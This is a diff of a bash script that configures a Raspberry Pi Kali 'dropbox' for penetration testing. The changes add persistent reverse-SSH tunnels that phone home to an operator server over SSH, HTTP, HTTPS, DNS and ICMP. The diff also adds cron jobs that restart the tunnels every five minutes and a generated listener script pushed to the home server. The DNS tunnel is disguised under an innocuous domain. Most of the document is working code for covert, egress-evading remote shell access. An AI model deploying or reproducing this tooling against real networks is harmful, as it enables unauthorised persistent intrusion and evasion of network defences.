@@ -1,8 +1,8 @@
 #!/bin/bash
 #-Metadata----------------------------------------------------#
-#  Filename: raspi-config.sh             (Update: 2015-10-30) #
+#  Filename: raspi-config.sh             (Update: 2016-02-26) #
 #-Info--------------------------------------------------------#
-#  Raspberry Pi Kali dropbox automated script                 #
+#  Raspberry Pi Kali dropbox automated script v2              #
 #-Author(s)---------------------------------------------------#
 #  jbarcia                                                    #
 #-Operating System--------------------------------------------#
@@ -18,8 +18,9 @@
 #   --tft     = Installs and configures TFT patched kernel    #
 #   --expand  = Expands Image size to fill SD card            #
 #   --wifi    = Configure wifi AP to start on boot            #
-#   --ssh     = Configure ssh phone home                      #
-#   e.g. # bash raspi-config.sh --tft                         #
+#   --ssh     = Configure ssh phone home over 				  #
+#					ssh/http/https/DNS                     	  #
+#   e.g. # bash raspi-config.sh --ssh --wifi                  #
 #                             ---                             #
 #                                                             #
 # Blog Posts:                                                 #
@@ -39,6 +40,17 @@
 #-------------------------------------------------------------#
 
 
+##### Variables
+ReverseSSHPivotPort=10022
+HTTPSSHPivotPort=10080
+HTTPSSSHPivotPort=10443
+DNSSSHPivotPort=10053
+ICMPSSHPivotPort=10000
+SSHPort=22
+HTTPPort=80
+HTTPSPort=443
+DNSPort=53
+
 ##### Optional steps
 BaseConfig=false             # Do not config base                            [ --base ]
 TFTinstall=false             # Do not install TFT patched kernel             [ --tft ]
@@ -53,7 +65,6 @@ YELLOW="\033[01;33m"   # Warnings/Information
 BLUE="\033[01;34m"     # Heading
 BOLD="\033[01;01m"     # Highlight
 RESET="\033[00m"       # Normal
-
 
 #-Arguments------------------------------------------------------------#
 
@@ -145,7 +156,7 @@ systemctl set-default multi-user.target
 ##### Update Raspberry Pi
 echo -e "\n ${GREEN}[+]${RESET} Updating ${GREEN}Raspberry Pi${RESET}"
 apt-get update && apt-get install kali-linux-full && apt-get -y upgrade && apt-get -y dist-upgrade
-apt-get install -y screen tmux hostapd dnsmasq wireless-tools iw wvdial resolvconf bridge-utils ebtables iptables arptables isc-dhcp-server
+apt-get install -y screen tmux hostapd dnsmasq wireless-tools iw wvdial resolvconf bridge-utils ebtables iptables arptables isc-dhcp-server autossh httptunnel
 fi
 
 
@@ -231,55 +242,461 @@ echo -e "\n ${YELLOW}[i]${RESET} Enter server name/IP to phone home to:"
 read SERVER
 echo -e "\n ${YELLOW}[i]${RESET} Enter the username for the home box:"
 read SERVUSR
-echo -e "\n ${YELLOW}[i]${RESET} Enter the pivot port:"
-read PIVPORT
+echo -e "\n ${YELLOW}[i]${RESET} Reverse-SSH Pivot port:${ReverseSSHPivotPort}"
+echo -e "\n ${YELLOW}[i]${RESET} HTTP-SSH Pivot port:${HTTPSSHPivotPort}"
+echo -e "\n ${YELLOW}[i]${RESET} HTTPS-SSH Pivot port:${HTTPSSSHPivotPort}"
+echo -e "\n ${YELLOW}[i]${RESET} DNS-SSH Pivot port:${DNSSSHPivotPort}"
+echo -e "\n ${YELLOW}[i]${RESET} ICMP-SSH Pivot port:${ICMPSSHPivotPort}"
+#read PIVPORT
 
 ##### Generate SSH Keys and add to authorized keys on main server
 ssh-keygen -t rsa
 cat ~/.ssh/id_rsa.pub | ssh $SERVUSR@$SERVER "cat - >> ~/.ssh/authorized_keys"
+
+cat <<EOF > "/root/server_autoconfig.sh"
+
+#!/bin/bash
+#-Metadata----------------------------------------------------#
+#  Filename: server_autoconfig.sh        (Update: 2016-02-26) #
+#-Info--------------------------------------------------------#
+#  Raspberry Pi Kali dropbox automated server script v1       #
+#-Author(s)---------------------------------------------------#
+#  jbarcia                                                    #
+#-Operating System--------------------------------------------#
+#  Designed for: Raspberry Pi 2 - Kali Linux 2 [ARM]          #
+#     Tested on: Raspberry Pi 2 - Kali Linux 2 [ARM]          #
+#-Licence-----------------------------------------------------#
+#  MIT License ~ http://opensource.org/licenses/MIT           #
+#-Notes-------------------------------------------------------#
+#  Run as root                                                #
+#  Script to perform Server Multi Handler setup               #
+# ------------------------------------------------------------#
+
+ if [ "$1" == "-h" ]; then
+        echo "Configures and starts all Reverse SSH Receiver tunnel listeners."
+        exit 0
+fi
+if [[ $EUID -ne 0 ]]; then
+   echo "This script must be run as root" 1>&2
+   exit 1
+fi
+# Generate SSH server keypair if needed
+files=$(ls /etc/ssh/*_key 2> /dev/null | wc -l)
+if [ "$files" != "0" ]; then
+        echo "[-] SSHd server keys already exist. Skipping generation..."
+ else
+        echo "[+] Generating SSHd server keys..."
+        sshd-generate
+fi
+# Kill any active tunnel connections & listeners
+for i in `netstat -lntup |grep rasppi |awk '{print$7}' |awk -F"/" '{print$1}'`; do kill $i ; done
+killall ptunnel
+killall stunnel
+killall dns2tcpd
+killall hts
+# Start/restart Backtrack SSH server
+echo "[+] Restarting SSHD..." /etc/init.d/ssh restart
+# Create rasppi user account if needed
+cut -d: -f1 /etc/passwd | grep "rasppi" > /dev/null
+OUT=$?
+if [ $OUT -eq 0 ];then
+        echo "[-] User 'rasppi' already exists. Skipping." else
+        echo "[+] Adding 'rasppi' user account..."
+        useradd -m rasppi
+fi
+# Make rasppi user .ssh directory if needed
+if [ ! -d "/home/rasppi/.ssh" ]; then
+        mkdir -p /home/rasppi/.ssh
+fi
+# Copy rasppi user SSH public key to authorized_keys
+#echo "$rasppi_user_ssh_key" > /home/rasppi/.ssh/authorized_keys
+# Configure & start Reverse-SSH-over-HTTP listener
+if [ -e "/usr/bin/hts" ]; then
+        echo "[-] HTTPTunnel is already installed."
+        echo "[+] Starting Reverse-SSH-over-HTTP (HTTPtunnel) listener..."
+        hts -F 0.0.0.0:22 80 & else
+        echo "[+] Installing HTTPtunnel via apt..."
+        apt-get --force-yes --yes -qq install httptunnel
+        echo "[+] Starting Reverse-SSH-over-HTTP (HTTPtunnel) listener..."
+        hts -F 0.0.0.0:22 80 &
+fi
+# Configure & start Reverse-SSH-over-SSL listener
+if [ -d "/root/stunnel/" ]; then
+        echo "[-] stunnel is already configured. Remove directory /root/stunnel/ and re-run this script if you want to reconfigure."
+        echo "[+] Starting Reverse-SSH-over-SSL (stunnel) listener..."
+        stunnel /root/stunnel/stunnel.conf & else
+        echo "[+] Configuring stunnel..."
+        echo "[+] Generating SSL certificate (press enter for all prompts)..."
+        #DIR='pwd'
+        mkdir /root/stunnel/ && cd /root/stunnel/
+        openssl genrsa -out pwn_key.pem 2048
+        openssl req -new -key pwn_key.pem -out pwn.csr
+        openssl x509 -req -in pwn.csr -out pwn_cert.pem -signkey pwn_key.pem -days 1825
+        cat pwn_cert.pem >> pwn_key.pem
+        #cd $DIR
+        echo "[+] SSL certificate created. Configuring stunnel.conf..."
+        echo -e "cert = /root/stunnel/pwn_key.pem\nchroot = /var/tmp/stunnel\npid = /stunnel.pid\nsetuid = root\nsetgid = root\nclient = no\n[22]\naccept = 443\nconnect = 22" >> /root/stunnel/stunnel.conf
+        mkdir /var/tmp/stunnel
+        echo "[+] Starting Reverse-SSH-over-SSL (stunnel) listener..."
+        /usr/bin/stunnel /root/stunnel/stunnel.conf &
+fi
+# Configure & start Reverse-SSH-over-DNS listener
+if [ -e /root/dns2tcpdrc ]; then
+        echo "[-] DNS2TCP is already configured. Remove /root/dns2tcpdrc and re-run this script if you want to reconfigure."
+        echo "[+] Starting Reverse-SSH-over-DNS (dns2tcp) listener..."
+        /usr/bin/dns2tcpd -d 0 -f /root/dns2tcpdrc &
+else
+        echo "[+] Configuring DNS2TCP..."
+        echo -e "listen = 0.0.0.0\nport = 53\nuser = nobody\nchroot = /var/empty/dns2tcp/\ndomain = rssfeeds.com\nresources = ssh:127.0.0.1:22" >> /root/dns2tcpdrc
+        mkdir -p /var/empty/dns2tcp/
+        echo "[+] Starting Reverse-SSH-over-DNS (dns2tcp) listener..."
+        /usr/bin/dns2tcpd -d 0 -f /root/dns2tcpdrc &
+fi
+# Start Reverse-SSH-over-ICMP listener
+        echo "[+] Starting Reverse-SSH-over-ICMP (ptunnel) listener (Logging to /tmp/ptunnel.log)..."
+        /usr/sbin/ptunnel -daemon /tmp/ptunnel -f /tmp/ptunnel.log & echo "" echo "[+] Setup Complete." echo "[+] Press ENTER to listen for incoming connections..." read INPUT watch -d "netstat -lntup4 | grep 'pwn' | grep 333"
+
+EOF
+
+cat /root/server_autoconfig.sh | ssh $SERVUSR@$SERVER "cat - >> ~/server_autoconfig.sh"
+
 		
-##### Create autossh script
-cat <<EOF > "/root/autossh.sh"
+##### Create revssh script
+cat <<EOF > "/root/revssh.sh"
 #!/bin/sh
-# Based on http://www.brandonhutchinson.com/ssh_tunnelling.html
+# $REMOTE_HOST is the name of the remote system
+REMOTE_HOST=$SERVER
+ 
+# Setting username for home box
+USER_NAME=$SERVUSR
+SSH_Port=$SSHPort
+
+# $PIVOT_PORT is the remote port number that will be used to tunnel
+# back to this system
+PIVOT_PORT=${ReverseSSHPivotPort} 
+
+EOF
+cat <<\EOF >> "/root/revssh.sh"
+
+Tunnel_status=`ps -C ssh -o pid,args |grep -o "${PIVOT_PORT}:localhost:22"`
+AUTOSSH_PID=`ps -C autossh -o pid,args |grep "autossh -2NR ${PIVOT_PORT}" |awk '{print$1}'`
+SSH_ChildProcess_PID=`ps -C ssh -o pid,args |grep "${PIVOT_PORT}:localhost:22" |awk '{print$1}'`
+
+
+# Set standard autossh variables
+export AUTOSSH_FIRST_POLL=60
+export AUTOSSH_POLL=60
+export AUTOSSH_GATETIME=30
+export AUTOSSH_LOGFILE=/var/log/autossh.log
+export AUTOSSH_DEBUG=no
+export AUTOSSH_PATH=/usr/bin/ssh
+
+# Set tunnel-specific autossh variables
+export AUTOSSH_PORT=26082
+export AUTOSSH_PIDFILE=/var/run/STD_autossh.pid
+
+# If tunnel already established, do nothing. If not, attempt connect.
+if [ "${Tunnel_status}" == "${PIVOT_PORT}:localhost:22" ] ; then echo connected ; \
+else \
+kill ${AUTOSSH_PID}; \
+kill ${SSH_ChildProcess_PID}; \
+sleep 1
+autossh -2NR ${PIVOT_PORT}:localhost:22 "${USER_NAME}"@"${REMOTE_HOST}" -p ${SSH_Port}; \
+fi
+EOF
+	
+
+
+##### Create httpssh script
+cat <<EOF > "/root/httpssh.sh"
+#!/bin/sh
+
+# Get user variables from script_configs
+#Proxy_enable=
+#Proxy_address=
+#Proxy_port=
+#Proxy_auth_user=
+#Proxy_auth_password=
+
 # $REMOTE_HOST is the name of the remote system
 REMOTE_HOST=$SERVER
  
 # Setting username for home box
 USER_NAME=$SERVUSR
  
-# $REMOTE_PORT is the remote port number that will be used to tunnel
+# $PIVOT_PORT is the remote port number that will be used to tunnel
 # back to this system
-REMOTE_PORT=$PIVPORT
+PIVOT_PORT=${HTTPSSHPivotPort}
+
+# Set SSH variables
+REMOTE_HOST_port=$HTTPPort
+
+EOF
+cat <<\EOF >> "/root/httpssh.sh"
+
+Tunnel_status=`ps -C ssh -o pid,args |grep -o "${PIVOT_PORT}:localhost:22"`
+AUTOSSH_PID=`ps -C autossh -o pid,args |grep "autossh -2NR ${PIVOT_PORT}" |awk '{print$1}'`
+SSH_ChildProcess_PID=`ps -C ssh -o pid,args |grep "${PIVOT_PORT}:localhost:22" |awk '{print$1}'`
+iptables_rule_status=`iptables -nvL |grep -o "tcp dpt:7777" |tail -n1`
+
+# Set standard autossh variables
+export AUTOSSH_FIRST_POLL=60
+export AUTOSSH_POLL=60
+export AUTOSSH_GATETIME=30
+export AUTOSSH_LOGFILE=/var/log/autossh.log
+export AUTOSSH_DEBUG=no
+export AUTOSSH_PATH=/usr/bin/ssh
+
+# Set tunnel-specific autossh variables
+export AUTOSSH_PORT=26088
+export AUTOSSH_PIDFILE=/var/run/HTTP_autossh.pid
+
+# Add iptables rule if not present
+if [ "${iptables_rule_status}" == "tcp dpt:7777" ] ; then echo "iptables rule present" ; \
+else iptables -A INPUT -i eth0 -p tcp --dport 7777 -j DROP
+fi
+
+# If tunnel already established, do nothing. If not, attempt connect.
+if [ "${Tunnel_status}" == "${PIVOT_PORT}:localhost:22" ] ; then echo connected ; \
+else \
+kill ${AUTOSSH_PID}; \
+kill ${SSH_ChildProcess_PID}; \
+killall htc ; \
+sleep 1
+
+if [ "$Proxy_enable" == "YES" ] ; then \
+echo "PROXY enabled: " "$Proxy_address" "$Proxy_port" ; \
+htc -P "$Proxy_address":"$Proxy_port" -A "$Proxy_auth_user":"$Proxy_auth_password" -F 7777 "$REMOTE_HOST":"$REMOTE_HOST_port" ; \
+sleep 1
+autossh -2NR ${PIVOT_PORT}:localhost:22 "$USER_NAME"@localhost -p 7777 ; \
+fi
+
+htc -F 7777 "$REMOTE_HOST":"$REMOTE_HOST_port" ; \
+sleep 1
+autossh -2NR ${PIVOT_PORT}:localhost:22 "$USER_NAME"@localhost -p 7777 ; \
+
+fi
+
+EOF
+
+
+##### Create httpsssh script
+cat <<EOF > "/root/httpsssh.sh"
+#!/bin/sh
+# $REMOTE_HOST is the name of the remote system
+REMOTE_HOST=$SERVER
+ 
+# Setting username for home box
+USER_NAME=$SERVUSR
+ 
+# $PIVOT_PORT is the remote port number that will be used to tunnel
+# back to this system
+PIVOT_PORT=${HTTPSSSHPivotPort}
  
 EOF
-cat <<\EOF >> "/root/autossh.sh"
-# $COMMAND is the command used to create the reverse ssh tunnel
-COMMAND="ssh -q -N -R $REMOTE_PORT:localhost:22 $USER_NAME@$REMOTE_HOST"
- 
-# Is the tunnel up? Perform two tests:
- 
-# 1. Check for relevant process ($COMMAND)
-pgrep -f -x "$COMMAND" > /dev/null 2>&1 || $COMMAND
- 
-# 2. Test tunnel by looking at "netstat" output on $REMOTE_HOST
-ssh $REMOTE_HOST netstat -an | egrep "tcp.*:$REMOTE_PORT.*LISTEN" \
-  	> /dev/null 2>&1
-if [ $? -ne 0 ] ; then
-  	pkill -f -x "$COMMAND"
-  	$COMMAND
+cat <<\EOF >> "/root/httpsssh.sh"
+
+Tunnel_status=`ps -C ssh -o pid,args |grep -o "${PIVOT_PORT}:localhost:22"`
+AUTOSSH_PID=`ps -C autossh -o pid,args |grep "autossh -2NR ${PIVOT_PORT}" |awk '{print$1}'`
+SSH_ChildProcess_PID=`ps -C ssh -o pid,args |grep "${PIVOT_PORT}:localhost:22" |awk '{print$1}'`
+
+# Set standard autossh variables
+export AUTOSSH_FIRST_POLL=60
+export AUTOSSH_POLL=60
+export AUTOSSH_GATETIME=30
+export AUTOSSH_LOGFILE=/var/log/autossh.log
+export AUTOSSH_DEBUG=no
+export AUTOSSH_PATH=/usr/bin/ssh
+
+# Set tunnel-specific autossh variables
+export AUTOSSH_PORT=26092
+export AUTOSSH_PIDFILE=/var/run/SSL_autossh.pid
+
+# If tunnel already established, do nothing. If not, attempt connect.
+if [ "${Tunnel_status}" == "${PIVOT_PORT}:localhost:22" ] ; then echo connected ; \
+else \
+kill ${AUTOSSH_PID}; \
+kill ${SSH_ChildProcess_PID}; \
+killall stunnel4 ; \
+sleep 1
+
+#stunnel -c -d 127.0.0.1:7779 -r "$REMOTE_HOST":443 ; \
+stunnel /root/stunnel.conf
+sleep 1
+autossh -2NR ${PIVOT_PORT}:localhost:22 "$USER_NAME"@localhost -p 7779 ; \
 fi
+
+EOF
+
+##### Create stunnel conf
+cat <<EOF > "/root/stunnel.conf"
+[https]
+client = yes
+accept = 127.0.0.1:7779
+connect = ${SERVER}:${HTTPSPort}
+
+EOF
+
+
+
+##### Create dnsssh script
+cat <<EOF > "/root/dnsssh.sh"
+#!/bin/sh
+# $REMOTE_HOST is the name of the remote system
+REMOTE_HOST=$SERVER
+ 
+# Setting username for home box
+USER_NAME=$SERVUSR
+ 
+# $PIVOT_PORT is the remote port number that will be used to tunnel
+# back to this system
+PIVOT_PORT=${DNSSSHPivotPort}
+ 
+EOF
+cat <<\EOF >> "/root/dnsssh.sh"
+
+Tunnel_status=`ps -C ssh -o pid,args |grep -o "${PIVOT_PORT}:localhost:22"`
+AUTOSSH_PID=`ps -C autossh -o pid,args |grep "autossh -2NR ${PIVOT_PORT}" |awk '{print$1}'`
+SSH_ChildProcess_PID=`ps -C ssh -o pid,args |grep "${PIVOT_PORT}:localhost:22" |awk '{print$1}'`
+
+# Set standard autossh variables
+export AUTOSSH_FIRST_POLL=60
+export AUTOSSH_POLL=60
+export AUTOSSH_GATETIME=30
+export AUTOSSH_LOGFILE=/var/log/autossh.log
+export AUTOSSH_DEBUG=no
+export AUTOSSH_PATH=/usr/bin/ssh
+
+# Set tunnel-specific autossh variables
+export AUTOSSH_PORT=26084
+export AUTOSSH_PIDFILE=/var/run/DNS_autossh.pid
+
+# If tunnel already established, do nothing. If not, attempt connect.
+if [ "${Tunnel_status}" == "${PIVOT_PORT}:localhost:22" ] ; then echo connected ; \
+else \
+kill ${AUTOSSH_PID}; \
+kill ${SSH_ChildProcess_PID}; \
+killall dns2tcpc; \
+sleep 1; \
+
+dns2tcpc -r ssh -l 7778 -z rssfeeds.com "${REMOTE_HOST}" & \
+sleep 1; \
+autossh -2NR ${PIVOT_PORT}:localhost:22 "${USER_NAME}"@localhost -p 7778 ; \
+fi
+
 EOF
 	
+
+##### Create icmpssh script
+cat <<EOF > "/root/icmpssh.sh"
+#!/bin/sh
+# $REMOTE_HOST is the name of the remote system
+REMOTE_HOST=$SERVER
+ 
+# Setting username for home box
+USER_NAME=$SERVUSR
+ 
+# $PIVOT_PORT is the remote port number that will be used to tunnel
+# back to this system
+PIVOT_PORT=${ICMPSSHPivotPort}
+ 
+EOF
+cat <<\EOF >> "/root/icmpssh.sh"
+
+Tunnel_status=`ps -C ssh -o pid,args |grep -o "${PIVOT_PORT}:localhost:22"`
+AUTOSSH_PID=`ps -C autossh -o pid,args |grep "autossh -2NR ${PIVOT_PORT}" |awk '{print$1}'`
+SSH_ChildProcess_PID=`ps -C ssh -o pid,args |grep "${PIVOT_PORT}:localhost:22" |awk '{print$1}'`
+iptables_rule_status=`iptables -nvL |grep -o "tcp dpt:7776" |tail -n1`
+
+# Set standard autossh variables
+export AUTOSSH_FIRST_POLL=60
+export AUTOSSH_POLL=60
+export AUTOSSH_GATETIME=30
+export AUTOSSH_LOGFILE=/var/log/autossh.log
+export AUTOSSH_DEBUG=no
+export AUTOSSH_PATH=/usr/bin/ssh
+
+# Set tunnel-specific autossh variables
+export AUTOSSH_PORT=26090
+export AUTOSSH_PIDFILE=/var/run/ICMP_autossh.pid
+
+# Add iptables rule if not present
+if [ "${iptables_rule_status}" == "tcp dpt:7776" ] ; then echo "iptables rule present" ; \
+else iptables -A INPUT -i eth0 -p tcp --dport 7776 -j DROP
+fi
+
+# If tunnel already established, do nothing. If not, attempt connect.
+if [ "${Tunnel_status}" == "${PIVOT_PORT}:localhost:22" ] ; then echo connected ; \
+else \
+kill ${AUTOSSH_PID}; \
+kill ${SSH_ChildProcess_PID}; \
+killall ptunnel ; \
+sleep 1
+
+ptunnel -lp 7776 -p "$REMOTE_HOST" -da "$REMOTE_HOST" -dp 22 -c eth0 & \
+sleep 1
+autossh -2NR ${PIVOT_PORT}:localhost:22 "$USER_NAME"@localhost -p 7776 ; \
+fi
+
+EOF
+
+
 ##### Make Executable
-chmod 755 /root/autossh.sh
+chmod 755 /root/revssh.sh
+chmod 755 /root/httpssh.sh
+chmod 755 /root/httpsssh.sh
+chmod 755 /root/dnsssh.sh
+chmod 755 /root/icmpssh.sh
+
+
+# cat <<EOF > "/etc/rc.local"
+# #!/bin/sh -e
+# #
+# # rc.local
+# #
+# # This script is executed at the end of each multiuser runlevel.
+# # Make sure that the script will "exit 0" on success or any other
+# # value on error.
+# #
+# # In order to enable or disable this script just change the execution
+# # bits.
+# #
+# # By default this script does nothing.
+# 
+# sleep 30
+# 
+# sh /root/revssh.sh &
+# sh /root/httpssh.sh &
+# sh /root/httpsssh.sh &
+# sh /root/dnsssh.sh &
+# sh /root/icmpssh.sh &
+# 
+# exit 0
+# 
+# EOF
+
+# ln -s /root/revssh.sh /etc/rc2.d/S99revssh.sh
+# ln -s /root/httpssh.sh /etc/rc2.d/S99httpssh.sh
+# ln -s /root/httpsssh.sh /etc/rc2.d/S99httpsssh.sh
+# ln -s /root/dnsssh.sh /etc/rc2.d/S99dnsssh.sh
+# ln -s /root/icmpssh.sh /etc/rc2.d/S99icmpssh.sh
 
 ##### Configure cron job to call home every 5 min
-cat <<EOF > "/etc/cron.d/autossh"
-*/5 * * * * root bash /root/autossh.sh
+cat <<EOF > "/etc/cron.d/revssh"
+*/5 * * * * root bash /root/revssh.sh
+*/5 * * * * root bash /root/httpssh.sh
+*/5 * * * * root bash /root/httpsssh.sh
+*/5 * * * * root bash /root/dnsssh.sh
+*/5 * * * * root bash /root/icmpssh.sh
 EOF
 
 ##### DONE
-echo -e "From The Main Server:   ssh -D 1080 -p $PIVPORT pi@localhost"
+#echo -e "From The Main Server:   ssh -D 1080 -p $PIVPORT pi@localhost"
+#echo -e "From The Main Server:   ssh -D 1080 -p $ReverseSSHPivotPort pi@localhost"
+#echo -e "From The Main Server:   ssh -D 1080 -p $HTTPSSHPivotPort pi@localhost"
+#echo -e "From The Main Server:   ssh -D 1080 -p $HTTPSSSHPivotPort pi@localhost"
+#echo -e "From The Main Server:   ssh -D 1080 -p $DNSSSHPivotPort pi@localhost"
+#echo -e "From The Main Server:   ssh -D 1080 -p $ICMPSSHPivotPort pi@localhost"
+
 fi
 
